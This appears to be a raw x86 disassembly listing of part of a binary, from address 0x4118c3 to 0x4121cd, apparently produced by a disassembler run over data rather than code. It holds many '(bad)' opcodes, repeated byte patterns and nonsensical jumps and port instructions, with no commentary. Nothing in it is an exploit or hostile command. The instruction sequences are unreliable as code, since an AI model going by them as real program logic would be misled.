  4118c3:	inc    DWORD PTR [esi-0x79d6d8a7]
  4118c9:	pop    ecx
  4118ca:	daa    
  4118cb:	sub    DWORD PTR [esi-0x79d6d8a7],eax
  4118d1:	pop    ecx
  4118d2:	daa    
  4118d3:	sub    DWORD PTR [eax],eax
  4118d5:	add    BYTE PTR [eax],al
  4118d7:	add    BYTE PTR [eax],al
  4118d9:	add    BYTE PTR [eax],al
  4118db:	add    BYTE PTR [ebp-0x58b9e89f],bl
  4118e1:	jae    0x411917
  4118e3:	rol    esi,cl
  4118e5:	scas   al,BYTE PTR es:[edi]
  4118e6:	(bad)  
  4118e7:	(bad)  
  4118e8:	fcmovnbe st,st(5)
  4118ea:	int    0xff
  4118ec:	fst    st(7)
  4118ee:	sar    bh,1
  4118f0:	lds    esi,FWORD PTR [ecx+0x73a2ff96]
  4118f6:	cmp    ebx,esp
  4118f8:	nop
  4118f9:	pop    ecx
  4118fa:	pop    ss
  4118fb:	pop    ecx
	...
  411908:	xchg   BYTE PTR [ecx+0x27],bl
  41190b:	sub    DWORD PTR [edi+ebp*2-0xe0300bc],edx
  411912:	jmp    0xf9ff:0xdce7fbff
  411919:	fmulp  st(6),st
  41191b:	(bad)  
  41191c:	clc    
  41191d:	aad    0xc2
  41191f:	push   edi
  411921:	sar    BYTE PTR [ecx+0x295b87ff],1
  411927:	inc    DWORD PTR [ebp-0x7b00d9a7]
  41192d:	push   edi
  41192e:	and    al,0xff
  411930:	test   BYTE PTR [edi+0x24],dl
  411933:	inc    DWORD PTR [esi+0x292759]
  411939:	add    BYTE PTR [eax],al
  41193b:	add    BYTE PTR [eax],al
  41193d:	add    BYTE PTR [eax],al
  41193f:	add    BYTE PTR [edi-0x60cde49d],bl
  411945:	arpl   WORD PTR [ebx],bx
  411947:	xchg   edi,eax
  411948:	lods   al,BYTE PTR ds:[esi]
  411949:	jl     0x41198d
  41194b:	into   
  41194c:	stos   DWORD PTR es:[edi],eax
  41194d:	jl     0x411993
  41194f:	rcr    BYTE PTR [edx-0x6960e4a0],cl
  411955:	pop    ebp
  411956:	sbb    bh,BYTE PTR [ebx]
	...
  411968:	xchg   BYTE PTR [ecx+0x27],bl
  41196b:	sub    DWORD PTR [ebp-0xb78f],edx
  411971:	stc    
  411972:	idiv   bh
  411974:	cld    
  411975:	icebp  
  411976:	jmp    0x411977
  411978:	sti    
  411979:	call   0xdf3c195a
  41197e:	int    0xff
  411980:	clc    
  411981:	aad    0xc2
  411983:	push   edi
  411985:	sar    BYTE PTR [ecx-0x462f0801],1
  41198b:	inc    DWORD PTR [ebp-0x7900d9a7]
  411991:	pop    ecx
  411992:	daa    
  411993:	dec    ebx
	...
  4119c8:	xchg   BYTE PTR [ecx+0x27],bl
  4119cb:	sub    DWORD PTR [edi-0xb38b],edx
  4119d1:	(bad)  
  4119d2:	(bad)  
  4119d3:	(bad)  
  4119d4:	(bad)  
  4119d5:	stc    
  4119d6:	idiv   edi
  4119d8:	cld    
  4119d9:	icebp  
  4119da:	jmp    0x4119db
  4119dc:	sti    
  4119dd:	call   0xde3c19be
  4119e2:	into   
  4119e3:	(bad)  
  4119e4:	clc    
  4119e5:	aad    0xc2
  4119e7:	dec    DWORD PTR [eax-0x7900d3a3]
  4119ed:	pop    ecx
  4119ee:	daa    
  4119ef:	dec    ebx
	...
  411a28:	xchg   BYTE PTR [ecx+0x27],bl
  411a2b:	sub    DWORD PTR [ecx-0xaf89],ebx
  411a31:	(bad)  
  411a32:	(bad)  
  411a33:	(bad)  
  411a34:	(bad)  
  411a35:	(bad)  
  411a36:	(bad)  
  411a37:	(bad)  
  411a38:	(bad)  
  411a39:	stc    
  411a3a:	idiv   bh
  411a3c:	std    
  411a3d:	icebp  
  411a3e:	jmp    0x8cff:0xdce7fbff
  411a45:	arpl   WORD PTR [edi+edi*8],si
  411a48:	xchg   BYTE PTR [ecx+0x27],bl
  411a4b:	dec    ebx
	...
  411a60:	lahf   
  411a61:	arpl   WORD PTR [ebx],bx
  411a63:	xor    bl,BYTE PTR [edi-0x5368e49d]
  411a69:	jl     0x411aad
  411a6b:	into   
  411a6c:	stos   DWORD PTR es:[edi],eax
  411a6d:	jl     0x411ab3
  411a6f:	rcr    BYTE PTR [edx-0x6960e4a0],cl
  411a75:	pop    ebp
  411a76:	sbb    bh,BYTE PTR [ebx]
	...
  411a88:	xchg   BYTE PTR [ecx+0x27],bl
  411a8b:	sub    DWORD PTR [ebx-0xab87],ebx
  411a91:	(bad)  
  411a92:	(bad)  
  411a93:	(bad)  
  411a94:	(bad)  
  411a95:	(bad)  
  411a96:	(bad)  
  411a97:	(bad)  
  411a98:	(bad)  
  411a99:	(bad)  
  411a9a:	(bad)  
  411a9b:	(bad)  
  411a9c:	(bad)  
  411a9d:	stc    
  411a9e:	idiv   edi
  411aa0:	(bad)
  411aa4:	xchg   BYTE PTR [ecx+0x27],bl
  411aa7:	dec    ebx
	...
  411abc:	xchg   ecx,eax
  411abd:	pop    esp
  411abe:	sbb    eax,0x205c8e27
  411ac3:	scas   al,BYTE PTR es:[edi]
  411ac4:	mov    ah,0x98
  411ac6:	jbe    0x411ab7
  411ac8:	rol    dh,cl
  411aca:	mov    bh,0xff
  411acc:	rol    bh,cl
  411ace:	mov    eax,0x7e9cb7ff
  411ad3:	repz test DWORD PTR [edi+0x25],edx
  411ad7:	mov    dh,0x7f
  411ad9:	push   eax
  411ada:	sbb    esi,DWORD PTR [eax+eax*1]
	...
  411ae5:	add    BYTE PTR [eax],al
  411ae7:	add    BYTE PTR [esi-0x63d6d8a7],al
  411aed:	jl     0x411b46
  411aef:	(bad)  
  411af0:	(bad)  
  411af1:	(bad)  
  411af2:	(bad)  
  411af3:	(bad)  
  411af4:	(bad)  
  411af5:	(bad)  
  411af6:	(bad)  
  411af7:	(bad)  
  411af8:	(bad)  
  411af9:	(bad)  
  411afa:	(bad)  
  411afb:	call   DWORD PTR [edi+ebp*2+0x5986ff46]
  411b02:	daa    
  411b03:	dec    ebx
	...
  411b18:	xchg   edi,eax
  411b19:	pusha  
  411b1a:	push   ds
  411b1b:	sbb    DWORD PTR [edi+ebx*2-0x43323be0],edx
  411b22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b23:	(bad)  
  411b24:	(bad)  
  411b25:	cld    
  411b26:	cld    
  411b27:	(bad)  
  411b28:	(bad)  
  411b29:	(bad)  
  411b2a:	(bad)  
  411b2b:	(bad)  
  411b2c:	(bad)  
  411b2d:	(bad)  
  411b2e:	(bad)  
  411b2f:	(bad)  
  411b30:	(bad)  
  411b31:	(bad)  
  411b32:	(bad)  
  411b33:	(bad)  
  411b34:	fxch   st(3)
  411b36:	mov    esp,0x295b87ff
  411b3b:	(bad)  
  411b3c:	adc    BYTE PTR [ecx+0x1c],0x2a
	...
  411b48:	xchg   BYTE PTR [ecx+0x27],bl
  411b4b:	sub    DWORD PTR [ebp-0xa682],ebx
  411b51:	(bad)  
  411b52:	(bad)  
  411b53:	(bad)  
  411b54:	(bad)  
  411b55:	(bad)  
  411b56:	(bad)  
  411b57:	call   FWORD PTR [eax-0x5500b08a]
  411b5d:	mov    DWORD PTR [ebp-0x1],esp
  411b60:	mov    ecx,0xb9ff7f9d
  411b65:	popf   
  411b66:	jg     0x411b67
  411b68:	mov    ecx,0xb9ff7f9d
  411b6d:	popf   
  411b6e:	jg     0x411b6f
  411b70:	mov    ecx,0xff7f9d
  411b75:	add    BYTE PTR [eax],al
  411b77:	add    BYTE PTR [eax-0x3c7fe19f],bl
  411b7d:	scas   al,BYTE PTR es:[edi]
  411b7e:	xchg   ecx,eax
  411b7f:	push   ebp
  411b81:	cli    
  411b82:	(bad)  
  411b83:	call   edi
  411b85:	in     al,dx
  411b86:	(bad)  
  411b88:	mov    cl,ah
  411b8a:	mov    edi,?
  411b8c:	jle    0x411b52
  411b8e:	cmp    bh,0xd6
  411b91:	jmp    0x411b6a
  411b93:	(bad)  
  411b94:	(bad)  
  411b95:	(bad)  
  411b96:	(bad)  
  411b97:	call   esp
  411b99:	les    esi,FWORD PTR [ebx+0x1d5281ff]
  411b9f:	lods   eax,DWORD PTR ds:[esi]
	...
  411ba8:	xchg   BYTE PTR [ecx+0x27],bl
  411bab:	sub    DWORD PTR [esi-0xa481],ebx
  411bb1:	(bad)  
  411bb2:	(bad)  
  411bb3:	call   FWORD PTR [ebx+edi*2-0x312400aa]
  411bba:	mov    edi,0xffffffff
  411bbf:	(bad)  
  411bc0:	(bad)  
  411bc1:	(bad)  
  411bc2:	(bad)  
  411bc3:	(bad)  
  411bc4:	(bad)  
  411bc5:	(bad)  
  411bc6:	(bad)  
  411bc7:	(bad)  
  411bc8:	(bad)  
  411bc9:	(bad)  
  411bca:	(bad)  
  411bcb:	(bad)  
  411bcc:	(bad)  
  411bcd:	(bad)  
  411bce:	(bad)  
  411bcf:	(bad)  
  411bd0:	mov    ecx,0xff7f9d
  411bd5:	add    BYTE PTR [eax],al
  411bd7:	add    BYTE PTR [eax-0x192fbc85],ch
  411bdd:	loop   0x411bc2
  411bdf:	jmp    eax
  411be1:	out    dx,al
  411be2:	jmp    0x1cff:0x6ed16bff
  411be9:	lods   al,BYTE PTR ds:[esi]
  411bea:	and    bh,bh
  411bec:	add    BYTE PTR [eax-0x5dc800fd],dl
  411bf2:	cmp    bh,bh
  411bf4:	out    0xf5,al
  411bf6:	call   0xfc3d1afa
  411bfb:	jmp    DWORD PTR [eax+0xf35a80]
  411c01:	add    BYTE PTR [eax],al
  411c03:	add    BYTE PTR [eax],al
  411c05:	add    BYTE PTR [eax],al
  411c07:	add    BYTE PTR [esi-0x61d6d8a7],al
  411c0d:	jg     0x411c6a
  411c0f:	call   FWORD PTR [ebp-0x5100a481]
  411c15:	cdq    
  411c16:	mov    edi,edi
  411c18:	mov    edi,0xbfffb2b4
  411c1d:	mov    ah,0xb2
  411c1f:	(bad)  
  411c20:	mov    edi,0xbfffb2b4
  411c25:	mov    ah,0xb2
  411c27:	(bad)  
  411c28:	mov    edi,0xbfffb2b4
  411c2d:	mov    ah,0xb2
  411c2f:	(bad)  
  411c30:	mov    ecx,0xff7f9d
  411c35:	add    BYTE PTR [eax],al
  411c37:	add    BYTE PTR [edi-0xd0f976c],dh
  411c3d:	out    dx,eax
  411c3e:	std    
  411c3f:	inc    esi
  411c41:	in     al,0xcb
  411c43:	dec    DWORD PTR [esi-0x2c]
  411c46:	push   ebx
  411c47:	inc    DWORD PTR [esi-0x35]
  411c4a:	dec    edx
  411c4b:	jmp    FWORD PTR [esi]
  411c4d:	mov    dl,0x32
  411c4f:	dec    DWORD PTR [ecx]
  411c51:	xchg   esp,eax
  411c52:	or     al,0xff
  411c54:	shl    dl,0xc1
  411c57:	(bad)  
  411c58:	(bad)  
  411c59:	(bad)  
  411c5a:	(bad)  
  411c5b:	(bad)  
  411c5c:	mov    ebx,0xff90a8
  411c61:	add    BYTE PTR [eax],al
  411c63:	add    BYTE PTR [eax],al
  411c65:	add    BYTE PTR [eax],al
  411c67:	add    BYTE PTR [esi-0x61d6d8a7],al
  411c6d:	jg     0x411cca
  411c6f:	(bad)  
  411c70:	fcmovne st,st(6)
  411c72:	mov    edi,0xb2b4bfff
  411c77:	(bad)  
  411c78:	mov    edi,0xbfffb2b4
  411c7d:	mov    ah,0xb2
  411c7f:	(bad)  
  411c80:	mov    edi,0xbfffb2b4
  411c85:	mov    ah,0xb2
  411c87:	(bad)  
  411c88:	mov    edi,0xbfffb2b4
  411c8d:	mov    ah,0xb2
  411c8f:	(bad)  
  411c90:	mov    ecx,0xff7f9d
  411c95:	add    BYTE PTR [eax],al
  411c97:	add    BYTE PTR [eax-0x1525ad7a],dh
  411c9d:	call   0xea181c8f
  411ca2:	fdivp  st(7),st
  411ca4:	arpl   ax,bx
  411ca6:	dec    DWORD PTR [bp+si-0x2b]
  411caa:	dec    esi
  411cab:	(bad)  
  411cac:	cmp    eax,0x3dff42c9
  411cb1:	mov    bh,0x40
  411cb3:	call   ebp
  411cb5:	jmp    0xfffb:0xfafdffd8
  411cbc:	stos   DWORD PTR es:[edi],eax
  411cbd:	lea    ebp,[ebx-0x9]
	...
  411ccc:	mov    ecx,0xffff7f9d
  411cd1:	(bad)  
  411cd2:	(bad)  
  411cd3:	(bad)  
  411cd4:	mov    edi,0xbfffb2b4
  411cd9:	mov    ah,0xb2
  411cdb:	(bad)  
  411cdc:	mov    edi,0xbfffb2b4
  411ce1:	mov    ah,0xb2
  411ce3:	(bad)  
  411ce4:	mov    edi,0xbfffb2b4
  411ce9:	mov    ah,0xb2
  411ceb:	(bad)  
  411cec:	mov    edi,0xb9ffb2b4
  411cf1:	popf   
  411cf2:	jg     0x411cf3
  411cf4:	add    BYTE PTR [eax],al
  411cf6:	add    BYTE PTR [eax],al
  411cf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411cf9:	imul   esp,DWORD PTR [edi],0xffffff9c
  411cfc:	rol    bl,1
  411cfe:	scas   eax,DWORD PTR es:[edi]
  411cff:	(bad)  
  411d00:	out    dx,al
  411d01:	hlt    
  411d02:	(bad)  
  411d03:	(bad)  
  411d04:	mov    ecx,0x75ffbee3
  411d09:	fnstcw WORD PTR [eax-0x1]
  411d0c:	outs   dx,DWORD PTR ds:[esi]
  411d0d:	xlat   BYTE PTR ds:[ebx]
  411d0e:	jb     0x411d0f
  411d10:	mov    bl,0xe0
  411d12:	mov    dh,0xff
  411d14:	stc    
  411d15:	cld    
  411d16:	(bad)  
  411d17:	jmp    edx
  411d19:	fxch   st(7)
  411d1b:	call   DWORD PTR [eax+0xcb2b62]
	...
  411d29:	add    BYTE PTR [eax],al
  411d2b:	add    BYTE PTR [ecx-0x8063],bh
  411d31:	(bad)  
  411d32:	(bad)  
  411d33:	(bad)  
  411d34:	mov    edi,0xbfffb2b4
  411d39:	mov    ah,0xb2
  411d3b:	(bad)  
  411d3c:	mov    edi,0xbfffb2b4
  411d41:	mov    ah,0xb2
  411d43:	(bad)  
  411d44:	mov    edi,0xbfffb2b4
  411d49:	mov    ah,0xb2
  411d4b:	(bad)  
  411d4c:	mov    edi,0xb9ffb2b4
  411d51:	popf   
  411d52:	jg     0x411d53
  411d54:	add    BYTE PTR [eax],al
  411d56:	add    BYTE PTR [eax],al
  411d58:	lahf   
  411d59:	arpl   WORD PTR [ebx],bx
  411d5b:	das    
  411d5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d5d:	je     0x411d94
  411d5f:	call   0x7ef3d
  411d64:	out    dx,eax
  411d65:	cmc    
  411d66:	(bad)  
  411d67:	(bad)  
  411d68:	jmp    0xea41125b
  411d6d:	in     eax,dx
  411d6e:	repz push edx
  411d71:	idiv   edi
  411d73:	jmp    ebx
  411d75:	(bad)  
  411d77:	jmp    DWORD PTR [ecx-0x7510bc8a]
  411d7d:	push   esi
  411d7e:	sbb    al,BYTE PTR [edi+0x0]
	...
  411d89:	add    BYTE PTR [eax],al
  411d8b:	add    BYTE PTR [ecx-0x8063],bh
  411d91:	(bad)  
  411d92:	(bad)  
  411d93:	(bad)  
  411d94:	(bad)  
  411d95:	(bad)  
  411d96:	(bad)  
  411d97:	(bad)  
  411d98:	(bad)  
  411d99:	(bad)  
  411d9a:	(bad)  
  411d9b:	(bad)  
  411d9c:	(bad)  
  411d9d:	(bad)  
  411d9e:	(bad)  
  411d9f:	(bad)  
  411da0:	(bad)  
  411da1:	(bad)  
  411da2:	(bad)  
  411da3:	(bad)  
  411da4:	(bad)  
  411da5:	(bad)  
  411da6:	(bad)  
  411da7:	(bad)  
  411da8:	(bad)  
  411da9:	(bad)  
  411daa:	(bad)  
  411dab:	(bad)  
  411dac:	(bad)  
  411dad:	(bad)  
  411dae:	(bad)  
  411daf:	(bad)  
  411db0:	mov    ecx,0xff7f9d
  411db5:	add    BYTE PTR [eax],al
  411db7:	add    BYTE PTR [eax],al
  411db9:	add    BYTE PTR [eax],al
  411dbb:	add    BYTE PTR [ebp-0x58b9e89f],bl
  411dc1:	jae    0x411df7
  411dc3:	rol    esi,cl
  411dc5:	scas   al,BYTE PTR es:[edi]
  411dc6:	(bad)  
  411dc7:	(bad)  
  411dc8:	fcmovnbe st,st(5)
  411dca:	int    0xff
  411dcc:	fst    st(7)
  411dce:	sar    bh,1
  411dd0:	lds    esi,FWORD PTR [ecx+0x73a2ff96]
  411dd6:	cmp    ebx,esp
  411dd8:	nop
  411dd9:	pop    ecx
  411dda:	pop    ss
  411ddb:	pop    ecx
	...
  411dec:	mov    ecx,0xb9ff7f9d
  411df1:	popf   
  411df2:	jg     0x411df3
  411df4:	mov    ecx,0xb9ff7f9d
  411df9:	popf   
  411dfa:	jg     0x411dfb
  411dfc:	mov    ecx,0xb9ff7f9d
  411e01:	popf   
  411e02:	jg     0x411e03
  411e04:	mov    ecx,0xb9ff7f9d
  411e09:	popf   
  411e0a:	jg     0x411e0b
  411e0c:	mov    ecx,0xb9ff7f9d
  411e11:	popf   
  411e12:	jg     0x411e13
	...
  411e20:	lahf   
  411e21:	arpl   WORD PTR [ebx],bx
  411e23:	xor    bl,BYTE PTR [edi-0x5368e49d]
  411e29:	jl     0x411e6d
  411e2b:	into   
  411e2c:	stos   DWORD PTR es:[edi],eax
  411e2d:	jl     0x411e73
  411e2f:	rcr    BYTE PTR [edx-0x6960e4a0],cl
  411e35:	pop    ebp
  411e36:	sbb    bh,BYTE PTR [ebx]
	...
  411e78:	sar    bh,0xff
  411e7b:	add    BYTE PTR [eax+0xe37f],al
  411e81:	aas    
  411e82:	rol    DWORD PTR [eax],0x0
  411e85:	cmp    eax,DWORD PTR [ecx-0x7ccf0000]
  411e8b:	add    BYTE PTR [eax],al
  411e8d:	xor    BYTE PTR [ebx+0x7300000],al
  411e93:	add    BYTE PTR [eax],al
  411e95:	xor    BYTE PTR [edi],al
  411e97:	add    BYTE PTR [eax],al
  411e99:	xor    BYTE PTR [ecx],al
  411e9b:	add    BYTE PTR [eax-0x3fffff90],al
  411ea1:	lock add DWORD PTR [eax],eax
  411ea4:	push   eax
  411ea6:	add    eax,DWORD PTR [eax]
  411ea8:	push   eax
  411eaa:	pop    es
  411eab:	add    al,al
  411ead:	lock sldt WORD PTR [eax+0x1f70]
  411eb5:	xor    BYTE PTR [ecx],al
  411eb7:	add    BYTE PTR [eax],al
  411eb9:	xor    BYTE PTR [ecx],al
  411ebb:	add    BYTE PTR [eax],al
  411ebd:	xor    BYTE PTR [ecx],al
  411ebf:	add    BYTE PTR [eax],al
  411ec1:	xor    BYTE PTR [ecx],al
  411ec3:	add    BYTE PTR [eax],al
  411ec5:	cmp    BYTE PTR [ecx],al
  411ec7:	add    BYTE PTR [eax],al
  411ec9:	cmp    BYTE PTR [ecx],al
  411ecb:	add    BYTE PTR [eax],al
  411ecd:	cmp    BYTE PTR [ecx],al
  411ecf:	add    BYTE PTR [eax-0x3ffffe88],al
  411ed5:	(bad)  
  411ed6:	inc    DWORD PTR [eax]
  411ed8:	sub    BYTE PTR [eax],al
  411eda:	add    BYTE PTR [eax],al
  411edc:	adc    al,0x0
  411ede:	add    BYTE PTR [eax],al
  411ee0:	sub    BYTE PTR [eax],al
  411ee2:	add    BYTE PTR [eax],al
  411ee4:	add    DWORD PTR [eax],eax
  411ee6:	and    BYTE PTR [eax],al
  411ee8:	add    BYTE PTR [eax],al
  411eea:	add    BYTE PTR [eax],al
  411eec:	nop
  411eed:	push   es
	...
  411efe:	add    BYTE PTR [eax],al
  411f00:	xlat   BYTE PTR ds:[ebx]
  411f01:	(bad)  
  411f02:	mov    dh,0x1
  411f04:	mov    esp,0x9f1b739b
  411f09:	and    si,WORD PTR [esi-0x53]
  411f0d:	jle    0x411f56
  411f0f:	(bad)  
  411f10:	mov    cl,0x88
  411f12:	push   edi
  411f13:	fcomp  DWORD PTR [ebp-0x5e62d799]
  411f19:	je     0x411f5b
  411f1b:	aaa    
  411f1c:	les    ebp,FWORD PTR [ebp+0x495]
	...
  411f3a:	add    BYTE PTR [eax],al
  411f3c:	sahf   
  411f3d:	jae    0x411f86
  411f3f:	add    DWORD PTR [edx-0x64f9bd91],ebx
  411f45:	jo     0x411f8a
  411f47:	push   es
  411f48:	mov    eax,ds:0x24b76
  411f4d:	add    BYTE PTR [eax],al
  411f4f:	add    BYTE PTR [ebx-0x68e98a66],bh
  411f55:	addr16 sub eax,0x779ab77f
  411f5b:	(bad)  
  411f5d:	into   
  411f5e:	sar    bl,0xe1
  411f61:	fxch   st(7)
  411f63:	dec    eax
  411f65:	mov    bl,0x9c
  411f67:	lock cdq 
  411f69:	je     0x411fb5
  411f6b:	lods   al,BYTE PTR ds:[esi]
  411f6c:	call   0x91aa:0xc23b4a74
  411f73:	add    al,0x0
	...
  411f89:	add    BYTE PTR [eax],al
  411f8b:	add    BYTE PTR [ebp-0x7ad8c496],dl
  411f91:	pop    eax
  411f92:	es jo  0x411f1a
  411f95:	pop    eax
  411f96:	es jo  0x411f2d
  411f99:	imul   edi,DWORD PTR [edx],0x4e79a22e
  411f9f:	add    bl,BYTE PTR [edx-0x429ad89a]
  411fa5:	mov    ds:0xebeeeb81,al
  411faa:	call   0xff3f1dae
  411faf:	(bad)  
  411fb0:	(bad)  
  411fb1:	(bad)  
  411fb2:	(bad)  
  411fb3:	(bad)  
  411fb4:	std    
  411fb5:	cld    
  411fb6:	sti    
  411fb7:	(bad)  
  411fb8:	(bad)  
  411fba:	(bad)  
  411fbd:	jne    0x41200b
  411fbf:	stos   BYTE PTR es:[edi],al
  411fc0:	mov    cl,0x92
  411fc2:	jo     0x411fe7
  411fc4:	add    BYTE PTR [eax],al
  411fc6:	add    BYTE PTR [eax],al
  411fc8:	mov    esi,0xa70383a1
  411fcd:	sbb    DWORD PTR [ebp+ecx*1+0x0],0x0
  411fd2:	add    BYTE PTR [eax],al
  411fd4:	add    BYTE PTR [eax],al
  411fd6:	add    BYTE PTR [eax],al
  411fd8:	cwde   
  411fd9:	outs   dx,BYTE PTR ds:[esi]
  411fda:	inc    ecx
  411fdb:	adc    DWORD PTR [esi-0x424bce9f],ecx
  411fe1:	xchg   ebx,eax
  411fe2:	outs   dx,BYTE PTR ds:[esi]
  411fe3:	jmp    DWORD PTR [eax-0x7a00b68b]
  411fe9:	pop    eax
  411fea:	es jo  0x411f91
  411fed:	jnp    0x41203f
  411fef:	push   es
  411ff0:	stos   DWORD PTR es:[edi],eax
  411ff1:	or     BYTE PTR [esi-0x3f],0xe3
  411ff5:	fcompp 
  411ff7:	push   edi
  411ff9:	cli    
  411ffa:	(bad)  
  411ffb:	(bad)  
  411ffc:	cli    
  411ffd:	cld    
  411ffe:	(bad)  
  411fff:	(bad)  
  412000:	std    
  412001:	std    
  412002:	(bad)  
  412003:	(bad)  
  412004:	(bad)  
  412005:	(bad)  
  412006:	(bad)  
  412007:	(bad)  
  412008:	sti    
  412009:	cli    
  41200a:	stc    
  41200b:	inc    ebp
  41200d:	mov    cl,0x99
  41200f:	in     eax,dx
  412010:	mov    bh,0x9c
  412012:	jge    0x41205d
  412014:	add    BYTE PTR [eax],al
  412016:	add    BYTE PTR [eax],al
  412018:	xchg   edi,eax
  412019:	outs   dx,DWORD PTR ds:[esi]
  41201a:	inc    esp
  41201b:	xor    eax,0x8b33628c
  412020:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412021:	jge    0x412077
  412023:	sbb    DWORD PTR [eax],eax
  412025:	add    BYTE PTR [eax],al
  412027:	add    BYTE PTR [eax+eiz*2+0x6b973531],cl
  41202e:	cmp    al,0xff
  412030:	fnsave [ebp+0x6b97ff97]
  412036:	cmp    eax,0x46729bc3
  41203b:	ss scas eax,DWORD PTR es:[edi]
  41203d:	xchg   DWORD PTR [ecx+0x2],esp
  412040:	mov    esi,0xf0ee7a9f
  412045:	lock cli 
  412047:	push   ebx
  412049:	idiv   esi
  41204b:	push   esi
  41204d:	stc    
  41204e:	(bad)  
  41204f:	(bad)  
  412050:	cli    
  412051:	sti    
  412052:	(bad)  
  412053:	(bad)  
  412054:	std    
  412055:	(bad)  
  412056:	(bad)  
  412057:	(bad)  
  412058:	(bad)  
  412059:	(bad)  
  41205a:	(bad)  
  41205b:	(bad)  
  41205c:	fcmove st,st(7)
  41205e:	ret    0xc3fd
  412061:	lods   eax,DWORD PTR ds:[esi]
  412062:	xchg   esp,eax
  412063:	push   esp
  412064:	add    BYTE PTR [eax],al
  412066:	add    BYTE PTR [eax],al
  412068:	xchg   BYTE PTR [edx+0x28],bl
  41206b:	dec    esp
  41206c:	mov    DWORD PTR [eax+0x30],esp
  41206f:	cmc    
  412070:	mov    esp,DWORD PTR [eax+0x30]
  412073:	(bad)  
  412074:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412075:	jle    0x4120cd
  412077:	adc    al,0x8b
  412079:	popa   
  41207a:	xor    BYTE PTR [ebx-0x5b4019],bh
  412080:	shl    BYTE PTR [edi+0x5885ff87],1
  412086:	and    eax,0x5a81a896
  41208b:	sldt   WORD PTR [eax]
  41208e:	add    BYTE PTR [eax],al
  412090:	mov    bh,0x91
  412092:	xlat   BYTE PTR fs:[ebx]
  412094:	jmp    0xfef6:0xf1ffebe8
  41209b:	push   edx
  41209d:	idiv   edi
  41209f:	push   esi
  4120a1:	stc    
  4120a2:	(bad)  
  4120a3:	(bad)  
  4120a4:	cli    
  4120a5:	cld    
  4120a6:	(bad)  
  4120a7:	(bad)  
  4120a8:	cld    
  4120a9:	cld    
  4120aa:	std    
  4120ab:	call   eax
  4120ad:	mov    edi,0xa2bdf7ac
  4120b2:	test   BYTE PTR [edi+0x0],cl
  4120b5:	add    BYTE PTR [eax],al
  4120b7:	add    BYTE PTR [edi-0x4eb3d6a5],al
  4120bd:	mov    esp,DWORD PTR [edi-0x1]
  4120c0:	retf   0x85a5
  4120c3:	dec    DWORD PTR [ebp-0x6a64cd9e]
  4120c9:	imul   edi,DWORD PTR [ebx],0xa0bbe4e6
  4120cf:	inc    DWORD PTR [edi+edx*2+0x779fc125]
  4120d6:	dec    ebp
  4120d7:	and    al,BYTE PTR [eax]
  4120d9:	add    BYTE PTR [eax],al
  4120db:	add    BYTE PTR [eax],al
  4120dd:	add    BYTE PTR [eax],al
  4120df:	add    BYTE PTR [edi-0x3173cc8d],ah
  4120e5:	mov    ebp,0xeeeaf9a7
  4120ea:	cmc    
  4120eb:	(bad)  
  4120ec:	out    dx,eax
  4120ed:	cmc    
  4120ee:	(bad)  
  4120ef:	push   edx
  4120f1:	idiv   esi
  4120f3:	push   ebp
  4120f5:	clc    
  4120f6:	std    
  4120f7:	(bad)  
  4120f8:	jmp    0x688f:0xb0fddde4
  4120ff:	int3   
  412100:	mov    ah,0x94
  412102:	outs   dx,DWORD PTR ds:[esi]
  412103:	xor    al,0x0
  412105:	add    BYTE PTR [eax],al
  412107:	add    BYTE PTR [edi-0x4cb3d5a5],al
  41210d:	xchg   ecx,eax
  41210e:	outs   dx,DWORD PTR ds:[esi]
  41210f:	(bad)  
  412110:	stc    
  412111:	fmul   st(4),st
  412113:	inc    esi
  412115:	mov    eax,ds:0xc3eaff81
  41211a:	stos   BYTE PTR es:[edi],al
  41211b:	inc    esp
  41211d:	fwait
  41211e:	js     0x412113
  412120:	test   DWORD PTR [eax+0x26],ebx
  412123:	xchg   DWORD PTR [esi-0x56e4bf93],edx
  412129:	test   BYTE PTR [esi+0xd],bl
  41212c:	mov    ch,0x91
  41212e:	outs   dx,DWORD PTR ds:[esi]
  41212f:	add    dh,BYTE PTR [ebx-0x54d3a876]
  412135:	jl     0x412179
  412137:	mov    dl,0xcd
  412139:	mov    ecx,0xdde0f3a1
  41213e:	(bad)  
  412140:	out    0xe5,al
  412142:	out    0xfe,al
  412144:	fmul   st,st(6)
  412146:	sar    ah,0xb6
  412149:	xchg   esi,eax
  41214a:	outs   dx,DWORD PTR ds:[esi]
  41214b:	aam    0xa0
  41214d:	jne    0x412192
  41214f:	arpl   WORD PTR [ebp+0xb83a2],di
  412155:	add    BYTE PTR [eax],al
  412157:	add    BYTE PTR [edi-0x4ab3d4a4],al
  41215d:	xchg   edi,eax
  41215e:	ja     0x41215e
  412160:	cli    
  412161:	out    0xdb,eax
  412163:	(bad)  
  412164:	clc    
  412165:	fmul   st(3),st
  412167:	(bad)  
  412168:	not    ebx
  41216a:	mov    edi,0x658bb5fe
  41216f:	in     al,dx
  412170:	xchg   BYTE PTR [ecx+0x27],bl
  412173:	xchg   ebx,eax
  412174:	test   DWORD PTR [eax+0x25],ebx
  412177:	xchg   ebx,eax
  412178:	test   BYTE PTR [edi+0x25],dl
  41217b:	xchg   ebx,eax
  41217c:	call   0x9ebb:0xca294671
  412183:	add    esi,DWORD PTR [ebx-0x59cda573]
  412189:	jb     0x4121bd
  41218b:	nop
  41218c:	mov    dh,0x8f
  41218e:	pusha  
  41218f:	sar    BYTE PTR [ebx-0x591f8d66],cl
  412195:	ja     0x4121d5
  412197:	mov    dl,0xa1
  412199:	jae    0x4121d6
  41219b:	push   esp
  41219c:	mov    ebx,0xe81a2
  4121a1:	add    BYTE PTR [eax],al
  4121a3:	add    BYTE PTR [eax],al
  4121a5:	add    BYTE PTR [eax],al
  4121a7:	add    BYTE PTR [eax-0x48b3d3a4],cl
  4121ad:	popf   
  4121ae:	jg     0x4121af
  4121b0:	cld    
  4121b1:	repnz in al,dx
  4121b3:	(bad)  
  4121b4:	cli    
  4121b5:	out    0xdc,eax
  4121b7:	(bad)  
  4121b8:	stc    
  4121b9:	fmul   st(3),st
  4121bb:	push   ecx
  4121bd:	int3   
  4121be:	mov    dh,0xff
  4121c0:	shr    DWORD PTR [eax-0x7f550078],1
  4121c6:	push   esi
  4121c7:	inc    DWORD PTR [ebp-0x5b50daa8]
  4121cd:	jg     0x412227
